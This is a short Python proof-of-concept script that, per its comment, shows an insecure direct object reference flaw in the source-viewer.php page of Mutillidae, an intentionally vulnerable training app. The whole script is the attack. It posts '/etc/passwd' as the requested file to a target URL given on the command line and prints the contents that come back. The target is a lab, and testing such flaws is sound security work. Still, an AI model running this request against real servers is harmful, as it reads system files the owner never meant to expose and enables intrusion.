#!/usr/bin/python

# This script will show that a direct object reference vulnerability
# exists in the mutillidae source-viewer.php script

import mechanize
from BeautifulSoup import BeautifulSoup
import sys
import urllib

if len(sys.argv) > 1:
    url = sys.argv[1]
    
    data = {'phpfile':'/etc/passwd', 'source-file-viewer-php-submit-button':'View+File'}
    br = mechanize.Browser()

    br.open(url, urllib.urlencode(data))
        
    # browse DOM to see if value changed
    bs = BeautifulSoup(br.response().read())
    
    spanText = bs.findAll('code')[0].getText()
    
    print spanText
